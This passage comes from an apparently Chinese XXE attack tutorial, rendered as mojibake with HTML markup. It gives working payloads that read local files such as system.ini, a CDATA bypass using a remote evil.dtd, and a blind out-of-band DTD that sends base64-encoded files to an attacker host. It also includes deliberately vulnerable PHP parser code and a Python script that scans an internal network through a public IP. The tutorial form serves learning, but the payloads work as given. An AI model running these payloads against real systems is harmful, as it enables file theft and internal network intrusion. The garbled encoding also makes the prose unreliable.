â€œDTDæ ‡è¯†åâ€ â€œå…¬ç”¨DTDçš„URIâ€&gt;</code></pre><p>è¿™ä¸ªåœ¨æˆ‘ä»¬çš„æ”»å‡»ä¸­ä¹Ÿå¯ä»¥èµ·åˆ°å’Œ SYSTEM ä¸€æ ·çš„ä½œç”¨</p><p><strong>é‡ç‚¹äºŒï¼š</strong></p><p>æˆ‘ä»¬ä¸Šé¢å·²ç»å°†å®žä½“åˆ†æˆäº†ä¸¤ä¸ªæ´¾åˆ«ï¼ˆå†…éƒ¨å®žä½“å’Œå¤–éƒ¨å¤–éƒ¨ï¼‰ï¼Œä½†æ˜¯å®žé™…ä¸Šä»Žå¦ä¸€ä¸ªè§’åº¦çœ‹ï¼Œå®žä½“ä¹Ÿå¯ä»¥åˆ†æˆä¸¤ä¸ªæ´¾åˆ«ï¼ˆé€šç”¨å®žä½“å’Œå‚æ•°å®žä½“ï¼‰ï¼Œåˆ«æ™•ã€‚ã€‚</p><p><strong>1.é€šç”¨å®žä½“</strong></p><p>ç”¨ &amp;å®žä½“å; å¼•ç”¨çš„å®žä½“ï¼Œä»–åœ¨DTD ä¸­å®šä¹‰ï¼Œåœ¨ XML æ–‡æ¡£ä¸­å¼•ç”¨</p><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM "file:///c:/windows/win.ini"&gt; ]&gt; &lt;updateProfile&gt;      &lt;firstname&gt;Joe&lt;/firstname&gt;      &lt;lastname&gt;&amp;file;&lt;/lastname&gt;      ... &lt;/updateProfile&gt;</code></pre><p><strong>2.å‚æ•°å®žä½“ï¼š</strong></p><p>(1)ä½¿ç”¨ <code>% å®žä½“å</code>(<strong>è¿™é‡Œé¢ç©ºæ ¼ä¸èƒ½å°‘</strong>) åœ¨ DTD ä¸­å®šä¹‰ï¼Œå¹¶ä¸”<strong>åªèƒ½åœ¨ DTD ä¸­ä½¿ç”¨ <code>%å®žä½“å;</code> å¼•ç”¨</strong><br> (2)åªæœ‰åœ¨ DTD æ–‡ä»¶ä¸­ï¼Œå‚æ•°å®žä½“çš„å£°æ˜Žæ‰èƒ½å¼•ç”¨å…¶ä»–å®žä½“<br> (3)å’Œé€šç”¨å®žä½“ä¸€æ ·ï¼Œå‚æ•°å®žä½“ä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨</p><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><pre><code>&lt;!ENTITY % an-element "&lt;!ELEMENT mytag (subtag)&gt;"&gt; &lt;!ENTITY % remote-dtd SYSTEM "http://somewhere.example.org/remote.dtd"&gt; %an-element; %remote-dtd;</code></pre><p><strong>æŠ›è½¬ï¼š</strong></p><p>å‚æ•°å®žä½“åœ¨æˆ‘ä»¬ Blind XXE ä¸­èµ·åˆ°äº†è‡³å…³é‡è¦çš„ä½œç”¨</p><h2 id="å››ã€æˆ‘ä»¬èƒ½åšä»€ä¹ˆ"><a href="#å››ã€æˆ‘ä»¬èƒ½åšä»€ä¹ˆ" class="headerlink" title="å››ã€æˆ‘ä»¬èƒ½åšä»€ä¹ˆ"></a><strong>å››ã€æˆ‘ä»¬èƒ½åšä»€ä¹ˆ</strong></h2><p>ä¸Šä¸€èŠ‚ç–¯ç‹‚æš—ç¤ºäº† <strong>å¤–éƒ¨å®žä½“</strong> ï¼Œé‚£ä»–ç©¶ç«Ÿèƒ½å¹²ä»€ä¹ˆï¼Ÿ</p><p>å®žé™…ä¸Šï¼Œå½“ä½ çœ‹åˆ°ä¸‹é¢è¿™æ®µä»£ç çš„æ—¶å€™ï¼Œæœ‰ä¸€ç‚¹å®‰å…¨æ„è¯†çš„å°ä¼™ä¼´åº”è¯¥éšéšçº¦çº¦èƒ½è§‰å¯Ÿå‡ºä»€ä¹ˆ</p><pre><code>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM "file:///c:/test.dtd" &gt;]&gt;&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p>æ—¢ç„¶èƒ½è¯» dtd é‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯èƒ½å°†è·¯å¾„æ¢ä¸€æ¢ï¼Œæ¢æˆæ•æ„Ÿæ–‡ä»¶çš„è·¯å¾„ï¼Œç„¶åŽæŠŠæ•æ„Ÿæ–‡ä»¶è¯»å‡ºæ¥ï¼Ÿ</p><h3 id="å®žéªŒä¸€ï¼šæœ‰å›žæ˜¾è¯»æœ¬åœ°æ•æ„Ÿæ–‡ä»¶-Normal-XXE"><a href="#å®žéªŒä¸€ï¼šæœ‰å›žæ˜¾è¯»æœ¬åœ°æ•æ„Ÿæ–‡ä»¶-Normal-XXE" class="headerlink" title="å®žéªŒä¸€ï¼šæœ‰å›žæ˜¾è¯»æœ¬åœ°æ•æ„Ÿæ–‡ä»¶(Normal XXE)"></a><strong>å®žéªŒä¸€ï¼šæœ‰å›žæ˜¾è¯»æœ¬åœ°æ•æ„Ÿæ–‡ä»¶(Normal XXE)</strong></h3><p>è¿™ä¸ªå®žéªŒçš„æ”»å‡»åœºæ™¯æ¨¡æ‹Ÿçš„æ˜¯åœ¨æœåŠ¡èƒ½æŽ¥æ”¶å¹¶è§£æž XML æ ¼å¼çš„è¾“å…¥å¹¶ä¸”æœ‰å›žæ˜¾çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±èƒ½è¾“å…¥æˆ‘ä»¬è‡ªå®šä¹‰çš„ XML ä»£ç ï¼Œé€šè¿‡å¼•ç”¨å¤–éƒ¨å®žä½“çš„æ–¹æ³•ï¼Œå¼•ç”¨æœåŠ¡å™¨ä¸Šé¢çš„æ–‡ä»¶</p><p>æœ¬åœ°æœåŠ¡å™¨ä¸Šæ”¾ä¸Šè§£æž XML çš„ php ä»£ç ï¼š</p><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><p><strong>xml.php</strong></p><pre><code>&lt;?php    libxml_disable_entity_loader (false);    $xmlfile = file_get_contents('php://input');    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);     $creds = simplexml_import_dom($dom);    echo $creds;?&gt;</code></pre><p><strong>payload:</strong></p><pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;!DOCTYPE creds [  &lt;!ENTITY goodies SYSTEM "file:///c:/windows/system.ini"&gt; ]&gt; &lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><p><strong>ç»“æžœå¦‚ä¸‹å›¾ï¼š</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002645-e7e63e5a-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002645-e7e63e5a-ec17-1.png" alt="img"></a></p><p>ä½†æ˜¯å› ä¸ºè¿™ä¸ªæ–‡ä»¶æ²¡æœ‰ä»€ä¹ˆç‰¹æ®Šç¬¦å·ï¼ŒäºŽæ˜¯æˆ‘ä»¬è¯»å–çš„æ—¶å€™å¯ä»¥è¯´æ˜¯ç›¸å½“çš„é¡ºåˆ©ï¼Œ<strong>é‚£ä¹ˆæˆ‘ä¹ˆè¦æ˜¯æ¢æˆä¸‹é¢è¿™ä¸ªæ–‡ä»¶å‘¢ï¼Ÿ</strong></p><p><strong>å¦‚å›¾æ‰€ç¤ºï¼š</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002645-e8138df6-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002645-e8138df6-ec17-1.png" alt="img"></a></p><p>æˆ‘ä»¬è¯•ä¸€ä¸‹ï¼š</p><p><strong>ç»“æžœå¦‚ä¸‹å›¾ï¼š</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002646-e844e770-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002646-e844e770-ec17-1.png" alt="img"></a></p><p>å¯ä»¥çœ‹åˆ°ï¼Œä¸ä½†æ²¡æœ‰è¯»åˆ°æˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶ï¼Œè€Œä¸”è¿˜ç»™æˆ‘ä»¬æŠ¥äº†ä¸€å †é”™ï¼Œæ€Žä¹ˆåŠžï¼Ÿè¿™ä¸ªæ—¶å€™å°±è¦ç¥­å‡ºæˆ‘ä»¬çš„å¦ä¸€ä¸ªç¥žå™¨äº†â€”â€”CDATA ï¼Œç®€å•çš„ä»‹ç»å¦‚ä¸‹(å¼•ç”¨è‡ªæˆ‘çš„ä¸€ç‰‡ä»‹ç» XML çš„åšå®¢)ï¼š</p><blockquote><p>æœ‰äº›å†…å®¹å¯èƒ½<strong>ä¸æƒ³è®©è§£æžå¼•æ“Žè§£æž</strong>æ‰§è¡Œï¼Œè€Œæ˜¯å½“åšåŽŸå§‹çš„å†…å®¹å¤„ç†ï¼Œç”¨äºŽæŠŠæ•´æ®µæ•°æ®è§£æžä¸ºçº¯å­—ç¬¦æ•°æ®è€Œä¸æ˜¯æ ‡è®°çš„æƒ…å†µåŒ…å«å¤§é‡çš„ &lt;&gt; &amp; æˆ–è€…<br> â€œ å­—ç¬¦ï¼ŒCDATAèŠ‚ä¸­çš„æ‰€æœ‰å­—ç¬¦éƒ½ä¼šè¢«å½“åšå…ƒç´ å­—ç¬¦æ•°æ®çš„å¸¸é‡éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯ xmlæ ‡è®°</p><pre><code>&lt;![CDATA[</code></pre><pre><code>XXXXXXXXXXXXXXXXX]]&gt;</code></pre><p>å¯ä»¥è¾“å…¥ä»»æ„å­—ç¬¦é™¤äº† ]]&gt; ä¸èƒ½åµŒå¥—</p><p>ç”¨å¤„æ˜¯ä¸‡ä¸€æŸä¸ªæ ‡ç­¾å†…å®¹åŒ…å«ç‰¹æ®Šå­—ç¬¦æˆ–è€…ä¸ç¡®å®šå­—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ CDATAåŒ…èµ·æ¥</p></blockquote><p>é‚£æˆ‘ä»¬æŠŠæˆ‘ä»¬çš„è¯»å‡ºæ¥çš„æ•°æ®æ”¾åœ¨ CDATA ä¸­è¾“å‡ºå°±èƒ½è¿›è¡Œç»•è¿‡ï¼Œä½†æ˜¯æ€Žä¹ˆåšåˆ°ï¼Œæˆ‘ä»¬æ¥ç®€ç­”çš„åˆ†æžä¸€ä¸‹ï¼š</p><p>é¦–å…ˆï¼Œæ‰¾åˆ°é—®é¢˜å‡ºçŽ°çš„åœ°æ–¹ï¼Œé—®é¢˜å‡ºçŽ°åœ¨</p><pre><code>...&lt;!ENTITY goodies SYSTEM "file:///c:/windows/system.ini"&gt; ]&gt;&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><p>å¼•ç”¨å¹¶ä¸æŽ¥å—å¯èƒ½ä¼šå¼•èµ· xml  æ ¼å¼æ··ä¹±çš„å­—ç¬¦(åœ¨XMLä¸­ï¼Œæœ‰æ—¶å®žä½“å†…åŒ…å«äº†äº›å­—ç¬¦ï¼Œå¦‚&amp;,&lt;,&gt;,â€,â€™ç­‰ã€‚è¿™äº›å‡éœ€è¦å¯¹å…¶è¿›è¡Œè½¬ä¹‰ï¼Œå¦åˆ™ä¼šå¯¹XMLè§£é‡Šå™¨ç”Ÿæˆé”™è¯¯)ï¼Œæˆ‘ä»¬æƒ³åœ¨å¼•ç”¨çš„ä¸¤è¾¹åŠ ä¸Š â€œ<!--[CDATA["å’Œ â€œ]]-->â€,ä½†æ˜¯å¥½åƒæ²¡æœ‰ä»»ä½•è¯­æ³•å‘Šè¯‰æˆ‘ä»¬å­—ç¬¦ä¸²èƒ½æ‹¼æŽ¥çš„ï¼ŒäºŽæ˜¯æˆ‘æƒ³åˆ°äº†èƒ½ä¸èƒ½ä½¿ç”¨å¤šä¸ªå®žä½“è¿žç»­å¼•ç”¨çš„æ–¹æ³•</p><p><strong>ç»“æžœå¦‚ä¸‹å›¾ï¼š</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002646-e885c2b8-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002646-e885c2b8-ec17-1.png" alt="img"></a></p><p>æ³¨æ„ï¼Œè¿™é‡Œé¢çš„ä¸‰ä¸ªå®žä½“éƒ½æ˜¯å­—ç¬¦ä¸²å½¢å¼ï¼Œè¿žåœ¨ä¸€èµ·å±…ç„¶æŠ¥é”™äº†ï¼Œè¿™è¯´æ˜Žæˆ‘ä»¬ä¸èƒ½åœ¨ xml ä¸­è¿›è¡Œæ‹¼æŽ¥ï¼Œè€Œæ˜¯éœ€è¦åœ¨æ‹¼æŽ¥ä»¥åŽå†åœ¨ xml ä¸­è°ƒç”¨ï¼Œé‚£ä¹ˆè¦æƒ³åœ¨ DTD<br> ä¸­æ‹¼æŽ¥ï¼Œæˆ‘ä»¬çŸ¥é“æˆ‘ä»¬åªæœ‰ä¸€ç§é€‰æ‹©ï¼Œå°±æ˜¯ä½¿ç”¨ å‚æ•°å®žä½“</p><p><strong>payload:</strong></p><pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY % start "&lt;![CDATA["&gt;   &lt;!ENTITY % goodies SYSTEM "file:///d:/test.txt"&gt;  &lt;!ENTITY % end "]]&gt;"&gt;  &lt;!ENTITY % dtd SYSTEM "http://ip/evil.dtd"&gt; %dtd; ]&gt; &lt;roottag&gt;&amp;all;&lt;/roottag&gt;</code></pre><p><strong>evil.dtd</strong></p><pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!ENTITY all "%start;%goodies;%end;"&gt;</code></pre><p><strong>ç»“æžœå¦‚ä¸‹å›¾ï¼š</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002646-e8b7bd54-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002646-e8b7bd54-ec17-1.png" alt="img"></a></p><p>æ„Ÿå…´è¶£çš„ç«¥éž‹å¯ä»¥åˆ†æžä¸€ä¸‹æ•´ä¸ªè°ƒç”¨è¿‡ç¨‹ï¼Œå› ä¸ºæˆ‘åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­æœ‰åˆ†æžä¸€ä¸ªç±»ä¼¼çš„ä¾‹å­ï¼ŒäºŽæ˜¯å‡ºäºŽç¯‡å¹…è€ƒè™‘æˆ‘è¿™é‡Œå°±ä¸åˆ†æžäº†ã€‚</p><blockquote><p><strong>æ³¨æ„ï¼š</strong></p><p>è¿™é‡Œæä¸€ä¸ªç‚¹ï¼Œå¦‚æžœæ˜¯åœ¨ java ä¸­ è¿˜æœ‰ä¸€ä¸ªåè®®èƒ½ä»£æ›¿ file åè®® ï¼Œé‚£å°±æ˜¯ netdoc ï¼Œä½¿ç”¨æ–¹æ³•æˆ‘ä¼šåœ¨åŽé¢çš„åˆ†æž å¾®ä¿¡çš„ XXE<br> çš„æ—¶å€™é¡ºå¸¦æ¼”ç¤º</p></blockquote><h3 id="æ–°çš„é—®é¢˜å‡ºçŽ°"><a href="#æ–°çš„é—®é¢˜å‡ºçŽ°" class="headerlink" title="æ–°çš„é—®é¢˜å‡ºçŽ°"></a><strong>æ–°çš„é—®é¢˜å‡ºçŽ°</strong></h3><p>ä½†æ˜¯ï¼Œä½ æƒ³æƒ³ä¹ŸçŸ¥é“ï¼Œæœ¬èº«äººå®¶æœåŠ¡å™¨ä¸Šçš„ XML å°±ä¸æ˜¯è¾“å‡ºç”¨çš„ï¼Œä¸€èˆ¬éƒ½æ˜¯ç”¨äºŽé…ç½®æˆ–è€…åœ¨æŸäº›æžç«¯æƒ…å†µä¸‹åˆ©ç”¨å…¶ä»–æ¼æ´žèƒ½æ°å¥½å®žä¾‹åŒ–è§£æž XML çš„ç±»ï¼Œå› æ­¤æˆ‘ä»¬æƒ³è¦çŽ°å®žä¸­åˆ©ç”¨è¿™ä¸ªæ¼æ´žå°±å¿…é¡»æ‰¾åˆ°ä¸€ä¸ªä¸ä¾é å…¶å›žæ˜¾çš„æ–¹æ³•â€”â€”å¤–å¸¦</p><h3 id="æ–°çš„è§£å†³æ–¹æ³•"><a href="#æ–°çš„è§£å†³æ–¹æ³•" class="headerlink" title="æ–°çš„è§£å†³æ–¹æ³•"></a><strong>æ–°çš„è§£å†³æ–¹æ³•</strong></h3><p>æƒ³è¦å¤–å¸¦å°±å¿…é¡»èƒ½å‘èµ·è¯·æ±‚ï¼Œé‚£ä¹ˆä»€ä¹ˆåœ°æ–¹èƒ½å‘èµ·è¯·æ±‚å‘¢ï¼Ÿ  å¾ˆæ˜Žæ˜¾å°±æ˜¯æˆ‘ä»¬çš„å¤–éƒ¨å®žä½“å®šä¹‰çš„æ—¶å€™ï¼Œå…¶å®žå…‰å‘èµ·è¯·æ±‚è¿˜ä¸è¡Œï¼Œæˆ‘ä»¬è¿˜å¾—èƒ½æŠŠæˆ‘ä»¬çš„æ•°æ®ä¼ å‡ºåŽ»ï¼Œè€Œæˆ‘ä»¬çš„æ•°æ®æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹å¤–çš„è¯·æ±‚ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬éœ€è¦åœ¨è¯·æ±‚ä¸­å¼•ç”¨å¦ä¸€æ¬¡è¯·æ±‚çš„ç»“æžœï¼Œåˆ†æžä¸‹æ¥åªæœ‰æˆ‘ä»¬çš„å‚æ•°å®žä½“èƒ½åšåˆ°äº†(å¹¶ä¸”æ ¹æ®è§„èŒƒï¼Œæˆ‘ä»¬å¿…é¡»åœ¨ä¸€ä¸ª DTD æ–‡ä»¶ä¸­æ‰èƒ½å®Œæˆâ€œè¯·æ±‚ä¸­å¼•ç”¨å¦ä¸€æ¬¡è¯·æ±‚çš„ç»“æžœâ€çš„è¦æ±‚)</p><h3 id="å®žéªŒäºŒï¼šæ— å›žæ˜¾è¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶-Blind-OOB-XXE"><a href="#å®žéªŒäºŒï¼šæ— å›žæ˜¾è¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶-Blind-OOB-XXE" class="headerlink" title="å®žéªŒäºŒï¼šæ— å›žæ˜¾è¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶(Blind OOB XXE)"></a><strong>å®žéªŒäºŒï¼šæ— å›žæ˜¾è¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶(Blind OOB XXE)</strong></h3><p><strong>xml.php</strong></p><pre><code>&lt;?phplibxml_disable_entity_loader (false);$xmlfile = file_get_contents('php://input');$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); ?&gt;</code></pre><p><strong>test.dtd</strong></p><pre><code>&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///D:/test.txt"&gt;&lt;!ENTITY % int "&lt;!ENTITY % send SYSTEM 'http://ip:9999?p=%file;'&gt;"&gt;</code></pre><p><strong>2019.5.8 æ›´æ–°</strong></p><p>æˆ‘å‘çŽ°ä¸Šé¢è¿™æ®µä»£ç ç”±äºŽè§£æžçš„é—®é¢˜å°† send å‰é¢çš„ HTML å®žä½“è½¬åŒ–æˆäº† % ,è™½ç„¶æˆ‘åœ¨ä¸‹é¢åšå‡ºäº†ä¸€äº›è§£é‡Šï¼Œä½†æ˜¯å› ä¸ºå­˜åœ¨å¤åˆ¶ç²˜è´´ä»£ç çš„è¡Œä¸ºï¼Œå› æ­¤æˆ‘å†³å®šè¿˜æ˜¯åœ¨è¿™é‡Œç”¨å›¾ç‰‡çš„å½¢å¼å†æ¬¡å±•ç¤ºä¸€ä¸‹æˆ‘çš„ä»£ç </p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190508205142-077ed10c-7190-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190508205142-077ed10c-7190-1.png" alt="img"></a></p><p><strong>payloadï¼š</strong></p><pre><code>&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM "http://ip/test.dtd"&gt;%remote;%int;%send;]&gt;</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e8e966b0-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e8e966b0-ec17-1.png" alt="img"></a></p><p><strong>ç»“æžœå¦‚ä¸‹ï¼š</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e90baeb4-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e90baeb4-ec17-1.png" alt="img"></a></p><p>æˆ‘ä»¬æ¸…æ¥šç¬¬çœ‹åˆ°æœåŠ¡å™¨ç«¯æŽ¥æ”¶åˆ°äº†æˆ‘ä»¬ç”¨ base64 ç¼–ç åŽçš„æ•æ„Ÿæ–‡ä»¶ä¿¡æ¯(ç¼–ç ä¹Ÿæ˜¯ä¸ºäº†ä¸ç ´ååŽŸæœ¬çš„XMLè¯­æ³•)ï¼Œä¸ç¼–ç ä¼šæŠ¥é”™ã€‚</p><p><strong>æ•´ä¸ªè°ƒç”¨è¿‡ç¨‹ï¼š</strong></p><p>æˆ‘ä»¬ä»Ž payload ä¸­èƒ½çœ‹åˆ° è¿žç»­è°ƒç”¨äº†ä¸‰ä¸ªå‚æ•°å®žä½“ %remote;%int;%send;ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬çš„åˆ©ç”¨é¡ºåºï¼Œ%remote  å…ˆè°ƒç”¨ï¼Œè°ƒç”¨åŽè¯·æ±‚è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„ test.dtd ï¼Œæœ‰ç‚¹ç±»ä¼¼äºŽå°† test.dtd åŒ…å«è¿›æ¥ï¼Œç„¶åŽ %int è°ƒç”¨ test.dtd ä¸­çš„  %file, %file å°±ä¼šåŽ»èŽ·å–æœåŠ¡å™¨ä¸Šé¢çš„æ•æ„Ÿæ–‡ä»¶ï¼Œç„¶åŽå°† %file çš„ç»“æžœå¡«å…¥åˆ° %send ä»¥åŽ(å› ä¸ºå®žä½“çš„å€¼ä¸­ä¸èƒ½æœ‰ %,  æ‰€ä»¥å°†å…¶è½¬æˆhtmlå®žä½“ç¼–ç  <code>%</code>)ï¼Œæˆ‘ä»¬å†è°ƒç”¨ %send; æŠŠæˆ‘ä»¬çš„è¯»å–åˆ°çš„æ•°æ®å‘é€åˆ°æˆ‘ä»¬çš„è¿œç¨‹ vps ä¸Šï¼Œè¿™æ ·å°±å®žçŽ°äº†å¤–å¸¦æ•°æ®çš„æ•ˆæžœï¼Œå®Œç¾Žçš„è§£å†³äº† XXE æ— å›žæ˜¾çš„é—®é¢˜ã€‚</p><h3 id="æ–°çš„æ€è€ƒï¼š"><a href="#æ–°çš„æ€è€ƒï¼š" class="headerlink" title="æ–°çš„æ€è€ƒï¼š"></a><strong>æ–°çš„æ€è€ƒï¼š</strong></h3><p>æˆ‘ä»¬åˆšåˆšéƒ½åªæ˜¯åšäº†ä¸€ä»¶äº‹ï¼Œé‚£å°±æ˜¯é€šè¿‡ file åè®®è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œæˆ–è€…æ˜¯é€šè¿‡ http åè®®å‘å‡ºè¯·æ±‚ï¼Œç†Ÿæ‚‰ SSRF  çš„ç«¥éž‹åº”è¯¥å¾ˆå¿«ååº”è¿‡æ¥ï¼Œè¿™å…¶å®žéžå¸¸ç±»ä¼¼äºŽ SSRF  ï¼Œå› ä¸ºä»–ä»¬éƒ½èƒ½ä»ŽæœåŠ¡å™¨å‘å¦ä¸€å°æœåŠ¡å™¨å‘èµ·è¯·æ±‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚æžœå°†è¿œç¨‹æœåŠ¡å™¨çš„åœ°å€æ¢æˆæŸä¸ªå†…ç½‘çš„åœ°å€ï¼Œï¼ˆæ¯”å¦‚  192.168.0.10:8080ï¼‰æ˜¯ä¸æ˜¯ä¹Ÿèƒ½å®žçŽ° SSRF åŒæ ·çš„æ•ˆæžœå‘¢ï¼Ÿæ²¡é”™ï¼ŒXXE å…¶å®žä¹Ÿæ˜¯ä¸€ç§ SSRF çš„æ”»å‡»æ‰‹æ³•ï¼Œå› ä¸º SSRF  å…¶å®žåªæ˜¯ä¸€ç§æ”»å‡»æ¨¡å¼ï¼Œåˆ©ç”¨è¿™ç§æ”»å‡»æ¨¡å¼æˆ‘ä»¬èƒ½ä½¿ç”¨å¾ˆå¤šçš„åè®®ä»¥åŠæ¼æ´žè¿›è¡Œæ”»å‡»ã€‚</p><h3 id="æ–°çš„åˆ©ç”¨ï¼š"><a href="#æ–°çš„åˆ©ç”¨ï¼š" class="headerlink" title="æ–°çš„åˆ©ç”¨ï¼š"></a><strong>æ–°çš„åˆ©ç”¨ï¼š</strong></h3><p>æ‰€ä»¥è¦æƒ³æ›´è¿›ä¸€æ­¥çš„åˆ©ç”¨æˆ‘ä»¬ä¸èƒ½å°†çœ¼å…‰å±€é™äºŽ file åè®®ï¼Œæˆ‘ä»¬å¿…é¡»æ¸…æ¥šåœ°çŸ¥é“åœ¨ä½•ç§å¹³å°ï¼Œæˆ‘ä»¬èƒ½ç”¨ä½•ç§åè®®</p><p><strong>å¦‚å›¾æ‰€ç¤º:</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png" alt="img"></a></p><p>PHPåœ¨å®‰è£…æ‰©å±•ä»¥åŽè¿˜èƒ½æ”¯æŒçš„åè®®ï¼š</p><p><strong>å¦‚å›¾æ‰€ç¤ºï¼š</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e965b74c-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e965b74c-ec17-1.png" alt="img"></a></p><blockquote><p><strong>æ³¨æ„ï¼š</strong></p><p>1.å…¶ä¸­ä»Ž2012å¹´9æœˆå¼€å§‹ï¼ŒOracle JDKç‰ˆæœ¬ä¸­åˆ é™¤äº†å¯¹gopheræ–¹æ¡ˆçš„æ”¯æŒï¼ŒåŽæ¥åˆæ”¯æŒçš„ç‰ˆæœ¬æ˜¯ Oracle JDK 1.7<br> update 7 å’Œ Oracle JDK 1.6 update 35<br> 2.libxml æ˜¯ PHP çš„ xml æ”¯æŒ</p></blockquote><h3 id="å®žéªŒä¸‰ï¼šHTTP-å†…ç½‘ä¸»æœºæŽ¢æµ‹"><a href="#å®žéªŒä¸‰ï¼šHTTP-å†…ç½‘ä¸»æœºæŽ¢æµ‹" class="headerlink" title="å®žéªŒä¸‰ï¼šHTTP å†…ç½‘ä¸»æœºæŽ¢æµ‹"></a><strong>å®žéªŒä¸‰ï¼šHTTP å†…ç½‘ä¸»æœºæŽ¢æµ‹</strong></h3><p>æˆ‘ä»¬ä»¥å­˜åœ¨ XXE æ¼æ´žçš„æœåŠ¡å™¨ä¸ºæˆ‘ä»¬æŽ¢æµ‹å†…ç½‘çš„æ”¯ç‚¹ã€‚è¦è¿›è¡Œå†…ç½‘æŽ¢æµ‹æˆ‘ä»¬è¿˜éœ€è¦åšä¸€äº›å‡†å¤‡å·¥ä½œï¼Œæˆ‘ä»¬éœ€è¦å…ˆåˆ©ç”¨ file  åè®®è¯»å–æˆ‘ä»¬ä½œä¸ºæ”¯ç‚¹æœåŠ¡å™¨çš„ç½‘ç»œé…ç½®æ–‡ä»¶ï¼Œçœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰å†…ç½‘ï¼Œä»¥åŠç½‘æ®µå¤§æ¦‚æ˜¯ä»€ä¹ˆæ ·å­ï¼ˆæˆ‘ä»¥linux ä¸ºä¾‹ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•è¯»å–  /etc/network/interfaces æˆ–è€… /proc/net/arp æˆ–è€… /etc/host æ–‡ä»¶ä»¥åŽæˆ‘ä»¬å°±æœ‰äº†å¤§è‡´çš„æŽ¢æµ‹æ–¹å‘äº†</p><p><strong>ä¸‹é¢æ˜¯ä¸€ä¸ªæŽ¢æµ‹è„šæœ¬çš„å®žä¾‹ï¼š</strong></p><pre><code>import requestsimport base64#Origtional XML that the server accepts#&lt;xml&gt;#    &lt;stuff&gt;user&lt;/stuff&gt;#&lt;/xml&gt;def build_xml(string):    xml = """&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;"""    xml = xml + "\r\n" + """&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;"""    xml = xml + "\r\n" + """&lt;!ENTITY xxe SYSTEM """ + '"' + string + '"' + """&gt;]&gt;"""    xml = xml + "\r\n" + """&lt;xml&gt;"""    xml = xml + "\r\n" + """    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;"""    xml = xml + "\r\n" + """&lt;/xml&gt;"""    send_xml(xml)def send_xml(xml):    headers = {'Content-Type': 'application/xml'}    x = requests.post('http://34.200.157.128/CUSTOM/NEW_XEE.php', data=xml, headers=headers, timeout=5).text    coded_string = x.split(' ')[-2] # a little split to get only the base64 encoded value    print coded_string#   print base64.b64decode(coded_string)for i in range(1, 255):    try:        i = str(i)        ip = '10.0.0.' + i        string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/'        print string        build_xml(string)    except:continue</code></pre><p><strong>è¿”å›žç»“æžœï¼š</strong></p><p><a 